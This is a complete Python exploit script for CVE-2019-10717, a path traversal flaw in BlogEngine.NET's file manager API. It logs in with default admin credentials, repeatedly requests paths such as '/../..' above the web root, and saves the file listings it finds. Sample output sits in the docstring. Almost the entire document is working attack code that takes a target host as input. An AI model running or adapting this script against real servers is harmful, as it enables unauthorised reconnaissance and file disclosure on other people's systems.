import argparse
import json
import os
import re
import requests
import sys

"""
Exploit for CVE-2019-10717

CVE Identified by: Aaron Bishop
Exploit written by: Aaron Bishop

Outputs list of filenames found in web root

python exploit.py -t $RHOST

?path=/../..
/../../archive.aspx
/../../archive.aspx.cs
/../../archive.aspx.designer.cs
/../../BlogEngine.NET.csproj
/../../BlogEngine.NET.csproj.user
/../../contact.aspx
/../../contact.aspx.cs
/../../contact.aspx.designer.cs
"""

urls = {
        "login": "/Account/login.aspx",
        "traversal": "/api/filemanager"
       }

def make_request(session, method, target, data={}):
    proxies = {
            "http": "127.0.0.1:8080",
            "https": "127.0.0.1:8080"
              }
    if method == 'GET':
        r = requests.Request(method, target, params=data)
    elif method == 'POST':
        r = requests.Request(method, target, data=data)
    prep = session.prepare_request(r)
    resp = session.send(prep, verify=False, proxies=proxies)
    return resp.text

def login(session, host, user, passwd):
    resp = make_request(session, 'GET', host+urls.get('login'))
    login_form = re.findall('<input\s+.*?name="(?P<name>.*?)"\s+.*?(?P<tag>\s+value="(?P<value>.*)")?\s/>', resp)
    login_data = dict([(i[0],i[2]) for i in login_form])
    login_data.update({'ctl00$MainContent$LoginUser$UserName': user})
    login_data.update({'ctl00$MainContent$LoginUser$Password': passwd})
    resp = make_request(session, 'POST', host+urls.get('login'), login_data)

def parse(body, path, outfile):
    paths = json.loads(body)
    new_paths = set()
    for i in paths:
        if i.get('FileType') == 0:
            new_paths.add(i.get('FullPath'))
        else:
            outfile.write("{path}\n".format(path=i.get('FullPath')))
    return new_paths

def traverse(session, host, paths, outfile, visited=set()):
    paths = set(paths) - visited
    for path in paths:
        print(path)
        outfile.write("\n?path={path}\n".format(path=path))
        visited.add(path)
        resp = make_request(session, 'GET', host+urls.get('traversal'), data=dict(path=path))
        new_paths = parse(resp, path, outfile)
        if new_paths:
            traverse(session, host, new_paths, outfile, visited)

def main(host, user, passwd, root, outfile):
    with requests.Session() as s:
        login(s, host, user, passwd)
        traverse(s, host, root, outfile)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10717 Path traversal')
    parser.add_argument('-t', '--target', action="store", dest="target", required=True, help='Target host')
    parser.add_argument('-u', '--user', default="admin", action="store", dest="user", help='Account on blog')
    parser.add_argument('-p', '--passwd', default="admin", action="store", dest="passwd", help='Password for account')
    parser.add_argument('-r', '--root', nargs='+', default="/../..", help='Starting paths')
    parser.add_argument('-s', '--ssl', action="store_true", help="Force SSL")
    parser.add_argument('-o', '--outfile', type=argparse.FileType('w'), default='CVE-2019-10717.txt')
    args = parser.parse_args()

    protocol = "https://" if args.ssl else "http://"
    if isinstance(args.root, str):
        args.root = [args.root]
    main(protocol + args.target, args.user, args.passwd, args.root, args.outfile)